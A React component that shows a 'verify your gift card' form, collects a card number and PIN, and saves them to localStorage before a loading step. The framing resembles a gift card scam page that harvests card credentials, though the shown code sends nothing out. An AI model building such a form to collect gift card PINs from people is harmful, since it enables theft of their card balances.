import React, { useState } from "react";

const CardNumPin = ({ currentStep }) => {
  const [cardNumber, setCardNumber] = useState("");
  const [pin, setPin] = useState("");
  const [error, setError] = useState("");

  const changeStep = async (e) => {
    e.preventDefault();

    if (!cardNumber.trim() || !pin.trim()) {
      setError("Please enter both the card number and PIN.");
      return;
    }

    try {
      // Retrieve existing GiftCardEntries from localStorage
      const storedEntries =
        JSON.parse(localStorage.getItem("GiftCardEntries")) || {};

      // Update the entries with the new input field values
      const updatedEntries = {
        ...storedEntries,
        "Card Number": cardNumber,
        PIN: pin,
      };

      // Save updated entries back to localStorage
      localStorage.setItem("GiftCardEntries", JSON.stringify(updatedEntries));

      // Navigate to the next step
      currentStep("Loading");
    } catch (err) {
      setError(err.message || "An unexpected error occurred.");
    }
  };

  return (
    <div className="form" id="form">
      <div className="form-container">
        <div className="ft-box">
          <h1 className="form-title">Let us help you verify your gift card</h1>
        </div>
        <div className="card-image"></div>
        <form onSubmit={changeStep}>
          <div className="form-group">
            <label htmlFor="card_number">Card Number</label>
            <input
              type="number"
              className="card-field"
              id="card_number"
              value={cardNumber}
              onChange={(e) => setCardNumber(e.target.value)}
            />
          </div>
          <br />
          <div className="form-group">
            <label htmlFor="pin">PIN</label>
            <input
              type="number"
              className="card-field"
              id="pin"
              value={pin}
              onChange={(e) => setPin(e.target.value)}
            />
          </div>
          <button type="submit" className="look">
            Look Up Card
          </button>
        </form>
      </div>
      <br />
      <br />
      <br />
      <br />
    </div>
  );
};

export default CardNumPin;
